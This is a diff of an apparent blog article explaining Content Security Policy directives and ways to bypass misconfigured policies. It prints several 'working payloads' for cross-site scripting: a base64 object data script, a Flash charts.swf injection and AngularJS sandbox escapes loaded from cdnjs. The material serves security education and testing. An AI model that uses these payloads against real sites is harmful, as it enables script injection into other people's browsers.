@@ -34,7 +34,7 @@ Now you may have a question that what are **default-src,img-src, style-src** and
 
 **Sources**: Sources are nothing but the defined directives values. Below are some common sources that are used to define the value of the above directives.
 
-**\*** : This allows any URL except data: blob: filesystem: schemes**self** : This source defines that loading of resources on the page is allowed from the same domain.**data:** This source allows loading resources via the data scheme (eg Base64 encoded images)**none**: This directive allows nothing to be loaded from any source.**unsafe-eval** : This allows the use of eval() and similar methods for creating code from strings. This is not a safe practice to include this source in any directive. For the same reason it is named as unsafe. **unsafe-hashes**: This allows to enable specific inline event handlers.**unsafe-inline:** This allows the use of inline resources, such as inline <script> elements, javascript: URLs, inline event handlers, and inline <style> elements. Again this is not recommended for security reasons.**nonce**: A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.
+ **\*** : This allows any URL except data: blob: filesystem: schemes**self** : This source defines that loading of resources on the page is  allowed from the same domain.**data:** This source allows loading resources via the data scheme (eg Base64 encoded images)**none**: This directive allows nothing to be loaded from any source.**unsafe-eval** : This allows the use of eval() and similar methods for creating code from strings. This is not a safe practice to include this source in any directive. For the same reason it is named as unsafe. **unsafe-hashes**: This allows to enable specific inline event handlers.**unsafe-inline:** This allows the use of inline resources, such as inline <script> elements, javascript: URLs, inline event handlers, and inline <style> elements. Again this is not recommended for security reasons.**nonce**: A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.
 
 Let's take an example of a CSP in a webpage [https://www.bhaveshthakur.com](https://www.bhaveshthakur.com/) and see how it works:
 
@@ -89,8 +89,7 @@ Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
 
 Misconfigured CSP policy again! we can see object-src and default-src are missing here.
 
-working payloads :<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch(e) {alert(1337)}//'>
-
+working payloads :<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch(e) {alert(1337)}//'>  
 <param name="AllowScriptAccess" value="always"></object>
 
 **Scenario**: **5**
@@ -117,13 +116,12 @@ In such scenarios where script-src is set to self and a javascript library domai
 
 working payloads :<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
 
- <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>  
  <div ng-app ng-csp>  
   {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}  
  </div>
 
-"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
-
+"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>  
 <div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
 
 **Scenario** : **8**
@@ -144,8 +142,8 @@ working payload :">'><script src="https://website.with.redirect.com/redirect?url
 
 **Scenario** : **10**
 
-Content-Security-Policy:  
-default-src 'self' data: \*; connect-src 'self'; script-src 'self' ;  
+Content-Security-Policy:   
+default-src 'self' data: \*; connect-src 'self'; script-src  'self' ;  
 report-uri /\_csp; upgrade-insecure-requests
 
 THE above CSP policy can be bypassed using iframes. The condition is that application should allow iframes from the whitelisted domain. Now using a special attribute srcdoc of iframe, XSS can be easily achieved.
@@ -156,6 +154,7 @@ I hope you enjoyed reading this. Special thanks to [@mikispag](https://twitter.c
 
 Thank You!
 
-For any feedback or suggestions reach out to me @[Bhavesh_Thakur\_](https://twitter.com/Bhavesh_Thakur_)
+For any feedback or suggestions reach out to me @[Bhavesh\_Thakur\_](https://twitter.com/Bhavesh_Thakur_)
+
 
 [Source](https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
